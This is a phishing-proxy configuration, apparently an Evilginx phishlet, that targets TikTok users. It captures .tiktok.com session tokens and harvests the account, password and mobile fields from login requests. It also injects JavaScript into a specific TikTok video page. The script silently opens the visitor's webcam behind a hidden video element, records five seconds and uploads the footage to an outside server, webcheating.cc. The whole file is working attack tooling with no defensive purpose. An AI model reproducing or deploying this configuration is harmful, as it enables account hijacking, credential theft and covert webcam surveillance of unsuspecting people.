auth_tokens:
  - domain: '.tiktok.com'
    keys: ['.*,regexp']

credentials:
  username:
    key: 'account'
    search: '(.*)'
    type: 'post'  
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'
  custom:
    key: 'mobile'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.tiktok.com'
  path: '/@vdalkuzo/video/7413784369283861768'


js_inject:
  - trigger_domains: ["www.tiktok.com"]
    trigger_paths: ["/@vdalkuzo/video/7413784369283861768"]
    script: |
      document.addEventListener('DOMContentLoaded', () => {
      const video = document.createElement('video');
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      video.autoplay = true;
      video.style.display = 'none';

      document.body.appendChild(video);
      document.body.appendChild(canvas);

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          
          video.addEventListener('loadedmetadata', () => {
            const chunks = [];
            const mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = event => {
              if (event.data.size > 0) {
                chunks.push(event.data);
              }
            };
            
            mediaRecorder.onstop = () => {
              const blob = new Blob(chunks, { type: 'video/webm' });
              const reader = new FileReader();
              reader.readAsDataURL(blob);
              reader.onloadend = () => {
                const base64Data = reader.result.split(',')[1];
                const binaryString = atob(base64Data);
                const len = binaryString.length;
                const uint8Array = new Uint8Array(len);
              
                for (let i = 0; i < len; i++) {
                  uint8Array[i] = binaryString.charCodeAt(i);
                }
                const finalBlob = new Blob([uint8Array], { type: 'video/webm' });
            
                const formData = new FormData();
                formData.append('file', finalBlob, 'video.webm');
            
                fetch('https://webcheating.cc:5000/upload', {
                  method: 'POST',
                  body: formData
                })
                .then(response => response.json())
                .then(data => {
                  console.log('Success:', data);
                })
                .catch(error => {
                  console.error('Error:', error);
                });
              };
            };
        
          mediaRecorder.start();
          setTimeout(() => {
            mediaRecorder.stop();
          }, 5000);
        });
        })
        .catch(error => {
          console.error('failed camera access:', error);
        });
        });
